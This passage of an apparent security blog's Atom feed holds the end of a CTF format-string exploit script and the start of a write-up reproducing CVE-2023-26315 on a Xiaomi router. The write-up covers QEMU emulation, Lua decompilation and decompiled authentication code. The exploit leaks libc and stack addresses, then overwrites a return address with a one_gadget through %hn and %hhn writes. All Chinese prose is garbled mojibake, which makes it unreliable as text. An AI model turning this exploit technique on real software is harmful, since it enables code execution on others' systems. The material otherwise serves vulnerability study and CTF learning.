class="number">3</span></span><br><span class="line">p=run()</span><br><span class="line"><span class="comment"># 1 æ³„éœ²libcå’Œstack</span></span><br><span class="line"><span class="comment"># 2 åˆ†ä¸¤æ¬¡è¦†ç›–retä¸ºone_gadget</span></span><br><span class="line">og=[<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,<span class="string">b&#x27;%9$p-%11$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">ogg=libc_base+og[<span class="number">2</span>]</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,ogg)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xE0</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>(ogg &amp; <span class="number">0xffff</span>).encode() +<span class="string">b&#x27;c%37$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>((stack_addr+<span class="number">2</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xff</span>).encode() +<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;%hhnï¼ˆå†™å…¥ä¸€å­—èŠ‚ï¼‰&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%hnï¼ˆå†™å…¥ä¸¤å­—èŠ‚ï¼‰&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%nï¼ˆ32ä½å†™å››å­—èŠ‚ï¼‰&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%ln &amp;#x2F;</summary>
      
    
    
    
    <category term="printf" scheme="http://s1nec-1o.github.io/categories/printf/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/printf/pwn/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-26315</title>
    <link href="http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/"/>
    <id>http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/</id>
    <published>2024-07-12T08:55:37.000Z</published>
    <updated>2024-07-12T08:57:58.814Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªcveæ˜¯æˆ‘è‡³ä»Šä»¥æ¥å¤ç°çš„æœ€ä¸ºå¤æ‚çš„æ¼æ´äº†ï¼ŒwinmtçœŸç¥ï¼</p><h2 id="å›ºä»¶ä»¿çœŸ"><a href="#å›ºä»¶ä»¿çœŸ" class="headerlink" title="å›ºä»¶ä»¿çœŸ"></a>å›ºä»¶ä»¿çœŸ</h2><p>é¦–å…ˆå›ºä»¶çš„æå–å¯ä»¥çœ‹<a href="https://zikh26.github.io/posts/3d9490d.html">zikh26</a>çš„åšå®¢ï¼Œéå¸¸è¯¦ç»†</p><p>å¦‚æœæ˜¯ç›´æ¥ä¸‹è½½å›ºä»¶åŒ…çš„è¯ï¼Œè¦å…ˆè¿è¡Œ<code>sudo apt install libvirt-daemon-system libvirt-clients virt-manager</code>ä¸‹è½½virbr0ç½‘æ¡¥</p><blockquote><p>ä½†æ˜¯æˆ‘åœ¨ä¸‹è½½çš„æ—¶å€™è¦æ±‚å¸è½½æ‰vmtoolï¼Œå¯èƒ½æ˜¯è½¯ä»¶å…³ç³»çš„å†²çªï¼Œä½†æ˜¯zikh26å¸ˆå‚…è¯´ä»–æ²¡é‡åˆ°è¿‡ï¼Œå› æ­¤æˆ‘çŒœæµ‹æ˜¯ç½‘å¡åˆ†é…çš„å†²çªæˆ–è€…æ˜¯ç½‘ç»œé…ç½®çš„å†²çªï¼Ÿï¼Ÿæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œå¦‚æœæœ‰äº†è§£çš„å¸ˆå‚…è¯·è·Ÿæˆ‘è¯´è¯´ï¼Œä¸è¿‡å¸è½½äº†ä¹Ÿæ²¡å…³ç³»ï¼Œä¸è¿‡æ˜¯æ‰‹æ”¹elfæ–‡ä»¶ç½¢äº†</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-M virt \</span><br><span class="line">-cpu cortex-a53 \</span><br><span class="line">-m 1G \</span><br><span class="line">-initrd initrd.img-5.10.0-29-arm64 \</span><br><span class="line">    -kernel vmlinuz-5.10.0-29-arm64 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/vda2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -drive <span class="keyword">if</span>=virtio,file=debian=3607-aarch64.qcow2,format=qcow2,<span class="built_in">id</span>=hd</span><br><span class="line">-netdev tap,<span class="built_in">id</span>=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=net0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆè‡ªå·±é…ç½®çœ‹çœ‹å¦‚æœä¸ä¼šçš„è¯çœ‹<a href="https://bbs.kanxue.com/thread-282034.htm">winmt</a>ä¹Ÿæ˜¯ååˆ†è¯¦ç»†ï¼Œtql</p><h2 id="luaæ–‡ä»¶åˆ†æ"><a href="#luaæ–‡ä»¶åˆ†æ" class="headerlink" title="luaæ–‡ä»¶åˆ†æ"></a>luaæ–‡ä»¶åˆ†æ</h2><p>ç”±äºå°ç±³è·¯ç”±å™¨åœ¨è¾ƒæ–°çš„ç‰ˆæœ¬é‡‡ç”¨äº†é­”æ”¹ç‰ˆçš„luaç¼–è¯‘å™¨ï¼Œå› æ­¤å¾—ä½¿ç”¨ç‰¹å®šçš„luaåç¼–è¯‘è½¯ä»¶ï¼Œè€Œè¿™ç‚¹å·²ç»æœ‰ç½‘ä¸Šçš„å¸ˆå‚…åšå‡ºæ¥äº†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-11-jdk</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/NyaMisty/unluac_miwifi.git</span><br><span class="line"><span class="built_in">cd</span> unluac_miwifi</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line">javac -d build -sourcepath src  src/unluac/*.java</span><br><span class="line">jar -cfm build/unluac.jar src/META-INF/MANIFEST.MF -C build</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿è¡Œè„šæœ¬æ¥æ‰¹é‡åç¼–è¯‘*.lua</p><p>è¿™é‡Œä½¿ç”¨winmtå¸ˆå‚…å†™çš„æ‰¹é‡è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">res = os.popen(<span class="string">&quot;find ./ -name *.lua&quot;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res)) :</span><br><span class="line">    path = res[i].strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;java -jar /home/winmt/unluac_miwifi/build/unluac.jar &quot;</span> + path + <span class="string">&quot; &gt; &quot;</span> + path + <span class="string">&quot;.dis&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾¿å¯ä»¥å¼€å§‹åˆ†æluaæ–‡ä»¶äº†</p><p>é¦–å…ˆçœ‹<code>/usr/lib/lua/luci/controller/api/xqdatacenter.lua</code>ï¼Œæ•´ä¸ªæ–‡ä»¶æ—¶é…ç½®ä¸€ä¸ªAPIæ§åˆ¶å™¨æ¨¡å—</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6</span><br><span class="line">  L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br><span class="line">  L1 = entry                                  <span class="comment">---default entry</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L3 = firstchild</span><br><span class="line">  L3 = L3()</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">300</span></span><br><span class="line">  L1(L2, L3, L4, L5)     <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;&#125; , firstchild() , _&quot;&quot; , 300 )</span></span><br><span class="line">  L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">301</span></span><br><span class="line">  L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br><span class="line">  L1 = entry            <span class="comment">---identify device</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;identify_device&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;identifyDevice&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">302</span></span><br><span class="line">  L6 = <span class="number">8</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                <span class="comment">--download</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">303</span></span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                <span class="comment">--upload</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">304</span></span><br><span class="line">  L6 = <span class="number">16</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                    <span class="comment">----thumbnail</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--device_id</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--check file exit?</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--ssh</span></span><br><span class="line">  ...</span><br><span class="line">  L1 = entry                       <span class="comment">---ssh status</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--file system probe</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                 <span class="comment">--file system resume</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‡½æ•°L0æ˜¯å®šä¹‰äº†ä¸€äº›ç±»ä¼¼ä¸Šä¼ ï¼Œä¸‹è½½ä¹‹ç±»çš„apiå…¥å£ï¼Œæ¯ä¸ªå…¥å£ç‚¹éƒ½æœ‰ç‰¹å®šçš„å¤„ç†å‡½æ•°</p><p>å¼€å¤´</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆé…ç½®ä¸€ä¸ªèŠ‚ç‚¹&#x2F;api&#x2F;xqdatacenterï¼Œfirstchildè®¾å®šäº†é»˜è®¤çš„å…¥å£æ–¹å¼ï¼Œsysauthå’Œsysauth_authenticatorè®¾ç½®äº†è®¤è¯æ–¹å¼ï¼Œå³åœ¨è®¿é—®&#x2F;api&#x2F;xqdatacenterè¿™ä¸ªèŠ‚ç‚¹çš„æ—¶å€™æ˜¯éœ€è¦é‰´æƒçš„ï¼Œå³é€šè¿‡<code>/usr/lib/lua/luci/dispatcher.lua</code>çš„aythenticator.jsonauthå‡½æ•°é‰´æƒï¼Œç”±äºè¿™æ˜¯å­¦ä¹ çš„è¿‡ç¨‹ï¼Œå› æ­¤å°½é‡æ¯ä¸ªåœ°æ–¹éƒ½å¼„æ‡‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">L10 = authenticator</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L11</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9, L10, L11, L12, L13, L14</span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;xiaoqiang.util.XQSysUtil&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = luci</span><br><span class="line">  L4 = L4.http</span><br><span class="line">  L4 = L4.xqformvalue</span><br><span class="line">  L5 = <span class="string">&quot;username&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = luci</span><br><span class="line">  L5 = L5.http</span><br><span class="line">  L5 = L5.xqformvalue</span><br><span class="line">  L6 = <span class="string">&quot;password&quot;</span></span><br><span class="line">  L5 = L5(L6)</span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.xqformvalue</span><br><span class="line">  L7 = <span class="string">&quot;nonce&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  <span class="keyword">if</span> L6 <span class="keyword">then</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkNonce</span><br><span class="line">    L8 = L6</span><br><span class="line">    L9 = getremotemac</span><br><span class="line">    L9, L10, L11, L12, L13, L14 = L9()</span><br><span class="line">    L7 = L7(L8, L9, L10, L11, L12, L13, L14)</span><br><span class="line">    <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = _UPVALUE0_</span><br><span class="line">      L7 = L7.checkUser</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L6</span><br><span class="line">      L10 = L5</span><br><span class="line">      L7 = L7(L8, L9, L10)</span><br><span class="line">      <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">        L7 = empower</span><br><span class="line">        L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L10 = <span class="literal">nil</span></span><br><span class="line">        L7(L8, L9, L10)</span><br><span class="line">        L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">        L8 = luci</span><br><span class="line">        L8 = L8.http</span><br><span class="line">        L8 = L8.header</span><br><span class="line">        L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">        L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">        L11 = L4</span><br><span class="line">        L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">        L13 = L7</span><br><span class="line">        L14 = <span class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">        L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">        L8(L9, L10)</span><br><span class="line">        L8 = L4</span><br><span class="line">        L9 = L7</span><br><span class="line">        <span class="keyword">return</span> L8, L9</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        L7 = loginAuthenFailed</span><br><span class="line">        L7()</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:1582,\&quot;msg\&quot;:\&quot;Invalid nonce\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkPlaintextPwd</span><br><span class="line">    L8 = L4</span><br><span class="line">    L9 = L5</span><br><span class="line">    L7 = L7(L8, L9)</span><br><span class="line">    <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = empower</span><br><span class="line">      L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L10 = <span class="literal">nil</span></span><br><span class="line">      L7(L8, L9, L10)</span><br><span class="line">      L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">      L8 = luci</span><br><span class="line">      L8 = L8.http</span><br><span class="line">      L8 = L8.header</span><br><span class="line">      L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">      L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">      L11 = L4</span><br><span class="line">      L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">      L13 = L7</span><br><span class="line">      L14 = <span class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">      L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">      L8(L9, L10)</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L7</span><br><span class="line">      <span class="keyword">return</span> L8, L9</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;Invalid token\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span 